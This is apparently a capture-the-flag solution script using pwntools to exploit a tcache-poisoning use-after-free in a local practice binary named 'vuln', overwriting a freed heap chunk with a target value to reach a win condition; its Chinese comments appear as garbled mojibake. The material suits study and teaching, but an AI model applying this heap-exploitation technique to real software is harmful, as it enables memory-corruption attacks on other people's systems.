#!/usr/bin/env python3
"""
Level 4: Tcache Poisoning - Solution (ç®€åŒ–ç‰ˆ)
ç›´æ¥ä½¿ç”¨UAFç¼–è¾‘å·²é‡Šæ”¾çš„chunks[0]
"""

from pwn import *

context.log_level = 'error'  # å‡å°‘è¾“å‡ºå¹²æ‰°

def solve():
    p = process('./vuln')

    target_value = 0xdeadbeefcafebabe

    def alloc():
        p.sendline(b'1')

    def free(idx):
        p.sendline(b'2')
        p.sendline(str(idx).encode())
        # ä¸ç­‰å¾…è¾“å‡ºï¼Œé¿å…å¡ä½

    def edit(idx, data):
        p.sendline(b'3')
        p.sendline(str(idx).encode())
        p.send(data + b'\n')

    log.info("Step 1: Allocate 7 chunks")
    for i in range(7):
        alloc()

    log.info("Step 2: Free all chunks")
    for i in range(7):
        free(i)
        time.sleep(0.01)  # å°å»¶è¿Ÿç¡®ä¿è¾“å‡ºå®Œæˆ

    log.info("Step 3: Edit chunks[0] via UAF")
    edit(0, p64(target_value))

    log.info("Step 4: Check win condition")
    p.sendline(b'4')

    output = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print(output)

    if 'Flag:' in output or 'ğŸ‰' in output:
        log.success("Level 4 è§£é¢˜æˆåŠŸï¼")
        return True
    else:
        log.failure("Level 4 è§£é¢˜å¤±è´¥")
        return False

if __name__ == '__main__':
    import time
    solve()
